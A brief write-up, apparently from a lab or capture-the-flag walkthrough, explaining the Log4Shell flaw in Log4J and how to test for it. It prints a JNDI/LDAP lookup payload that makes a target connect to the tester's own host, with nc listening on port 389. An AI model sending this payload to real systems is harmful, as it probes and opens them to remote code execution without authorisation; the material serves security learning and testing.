Log4Shell POC Vulnerability Background The issue with Log4Shell is that the Log4J logging module doesn’t handle well the pattern ${[stuff]} . By putting a JNDI/LDAP url in that pattern, it will cause the logger to fetch data from an arbitrary server and, if that is serialized Java, that leads to execution. Proof of Vulnerability To test for this, I’ll send listen on TCP port 389 (LDAP default) with nc and then enter a payload that will attempt to contact my host on 389: ${jndi:ldap://10.10.14.6/test} If there’s a connection to my host, then the server is likely vulnerable to Log4Shell.
